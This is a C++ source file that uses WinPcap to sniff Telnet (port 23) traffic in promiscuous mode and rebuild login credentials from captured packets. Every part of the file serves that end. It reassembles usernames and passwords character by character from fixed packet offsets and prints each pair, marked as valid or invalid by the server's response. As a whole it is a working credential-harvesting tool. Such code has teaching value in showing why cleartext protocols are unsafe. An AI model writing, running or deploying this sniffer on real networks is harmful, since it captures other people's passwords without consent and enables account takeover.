/*
 * Project created by Alireza Parchami(AlirezaPRM)
 * For more information Please visit: https://github.com/AlirezaParchami
 * Email: Alirezaprm76@gmail.com
*/
#include <iostream>
#include <stdio.h>
#include <pcap.h>
#include <string>

#include <winsock2.h>
#include<ws2tcpip.h>
using namespace std;
#define IPTOSBUFFERS    12


/* 4 bytes IP address */
typedef struct ip_address{
    u_char byte1;
    u_char byte2;
    u_char byte3;
    u_char byte4;
}ip_address;

/* IPv4 header */
typedef struct ip_header{
    u_char  ver_ihl;        // Version (4 bits) + Internet header length (4 bits)
    u_char  tos;            // Type of service
    u_char tlen;           // Total length
    u_char tlen2;
    u_short identification; // Identification
    u_short flags_fo;       // Flags (3 bits) + Fragment offset (13 bits)
    u_char  ttl;            // Time to live
    u_char  proto;          // Protocol
    u_short crc;            // Header checksum
    ip_address  saddr;      // Source address
    ip_address  daddr;      // Destination address
    u_int   op_pad;         // Option + Padding
}ip_header;

typedef struct telnet_header{
    u_char value;
}telnet_header;

typedef struct login_header{
    u_char value[6];
}login_header;

typedef struct pass_header{
    u_char value[9];
}pass_header;
typedef struct error_header{
    u_char value[23];
}error_header;
typedef struct accept_header{
    u_char value[4];
}accept_header;

void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);

//Compare Function for compare unsigned char* and string with n char
bool compare(u_char* a , string b , int n)
{
    bool ans = true;
    for(int i=0;i<n;i++)
        if(a[i] != b.at(i))
            ans = false;
    return ans;
}

int main()
{
    pcap_if_t *alldevs;
    pcap_if_t *d;
    int inum;
    int i=0;
    pcap_t *adhandle;
    char errbuf[PCAP_ERRBUF_SIZE];
    u_int netmask;
    struct bpf_program fcode;

    /* Retrieve the device list */
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
    {
        fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
        exit(1);
    }

    /* Print the list */
    for(d=alldevs; d; d=d->next)
    {
        printf("%d. %s", ++i, d->name);
        if (d->description)
            printf(" (%s)\n", d->description);
        else
            printf(" (No description available)\n");
    }

    if(i==0)
    {
        printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
        return -1;
    }

    printf("Enter the interface number (1-%d):",i);
    std::cin >> inum;
    if(inum < 1 || inum > i)
    {
        printf("\nInterface number out of range.\n");
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return -1;
    }

    /* Jump to the selected adapter */
    for(d=alldevs, i=0; i< inum-1 ;d=d->next, i++);

    /* Open the adapter */
    if ( (adhandle= pcap_open(d->name,  // name of the device
                              65536,     // portion of the packet to capture.
                              // 65536 grants that the whole packet will be captured on all the MACs.
                              PCAP_OPENFLAG_PROMISCUOUS,         // promiscuous mode
                              1000,      // read timeout
                              NULL,      // remote authentication
                              errbuf     // error buffer
                              ) ) == NULL)
    {
        fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n");
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return -1;
    }

    /* Check the link layer. We support only Ethernet for simplicity. */
    if(pcap_datalink(adhandle) != DLT_EN10MB)
    {
        fprintf(stderr,"\nThis program works only on Ethernet networks.\n");
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return -1;
    }


    if(d->addresses != NULL)
        /* Retrieve the mask of the first address of the interface */
        netmask=((struct sockaddr_in *)(d->addresses->netmask))->sin_addr.S_un.S_addr;
    else
        /* If the interface is without addresses we suppose to be in a C class network */
        netmask=0xffffff;



    char filter_exp[] = "port 23";	/* The filter expression */
    //compile the filter
    if (pcap_compile(adhandle, &fcode, filter_exp, 1, netmask) <0 )
    {
        fprintf(stderr,"\nUnable to compile the packet filter. Check the syntax.\n");
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return -1;
    }

    //set the filter
    if (pcap_setfilter(adhandle, &fcode)<0)
    {
        fprintf(stderr,"\nError setting the filter.\n");
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return -1;
    }

    printf("\nlistening on %s...\n", d->description);

    /* At this point, we don't need any more the device list. Free it */
    pcap_freealldevs(alldevs);

    /* start the capture */
    pcap_loop(adhandle, 0, packet_handler, NULL);

    return 0;
}

int count = 0;
int error_count = 0;
string username="";
string password="";
int tmp = -1 ;
/* Callback function invoked by libpcap for every incoming packet */
void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data)
{
    count++;
    ip_header *ih;
    telnet_header *th;
    login_header *lh;
    pass_header *ph;
    error_header *eh;
    accept_header *ah;
    u_int ip_len;

    (VOID)(param);


    ih = (ip_header *) (pkt_data +
                        14);

    if(header->caplen == 63) // Login
    {
        lh = (login_header *) (pkt_data + 56);
        lh->value[5] = 0;
    }
    else if (header->caplen == 66) // password
    {
        ph = (pass_header *) (pkt_data + 56);
        ph->value[8] = 0;
    }
    else if(header->caplen == 55) //Word
    {
        th = (telnet_header *) (pkt_data + 54);
    }
    else if(header->caplen == 105 || header->caplen == 139) //error
    {
        eh = (error_header *) (pkt_data + 56);
        eh->value[22] = 0;
    }
    else if (header->caplen == 57 ) //accept
    {
        ah = (accept_header *) (pkt_data + 54);
        ah->value[3] = 0;
    }
    else
        return;


    if((header->caplen == 66) && (compare(ph->value , "password" , 8))) //password
        tmp = 1;
    else if((header->caplen == 63) && (compare(lh->value , "login" , 5))) //login
        tmp = 0;
    else if (header->caplen == 105 || header->caplen == 139) //error
    {
        if(compare(eh->value , "The handle is invalid.",22))
        {
            cout << "!!!!! Invalid username or password:" << endl
                 << "username: " << username << endl
                 << "password: " << password <<endl
                 << "-----------------------------" << endl;
            username = "";
            password ="";
            error_count++;
            if(error_count >=3)
            {
                tmp = -1;
                error_count = 0;
            }
            else
                tmp = 0;
            //cout << "user:" << username <<endl<< "pass:" << password <<endl<< "error_count:" << error_count<<endl<<"tmp:" << tmp <<endl;

        }
    }
    else if (header->caplen == 57) //accept
    {
        if((ah->value[0]==255) && (ah->value[1]==251) && (ah->value[2] ==24))
            cout << "+ Valid username or password:" << endl
                 << "username: " << username << endl
                 << "password: " << password <<endl
                 << "----------------------------" << endl;
        username = "";
        password ="";
        tmp = -1;
        error_count = 0;
        // cout << "user:" << username <<endl<< "pass:" << password <<endl<< "error_count:" << error_count<<endl<<"tmp:" << tmp <<endl;
    }
    else
        if(tmp == 0)
        {
            username += th->value;
        }
        else if (tmp == 1)
        {
            password += th->value;
        }
}
